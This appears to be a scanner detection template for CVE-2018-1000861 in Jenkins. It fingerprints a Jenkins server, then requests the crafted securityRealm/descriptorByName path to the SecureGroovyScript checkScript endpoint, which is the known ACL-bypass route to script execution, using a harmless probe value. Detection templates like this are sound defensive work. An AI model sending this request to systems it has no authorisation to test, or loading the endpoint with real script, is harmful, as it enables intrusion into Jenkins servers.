id: CVE-2018-1000861
name: "Jenkins ACL Bypass and Script Execution"
severity: critical
description: "Jenkins before 2.153 and LTS before 2.138.3 allows ACL bypass via crafted URLs leading to code execution."
reference: CWE-287
confidence: tentative
requests:
  - method: GET
    path: "/"
    matchers:
      - type: body
        words:
          - "Jenkins"
      - type: status
        status: [200]
    condition: and
  - method: GET
    path: "/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&value=1"
    matchers:
      - type: body
        words:
          - "Jenkins"
          - "result"
      - type: status
        status: [200]
    condition: and
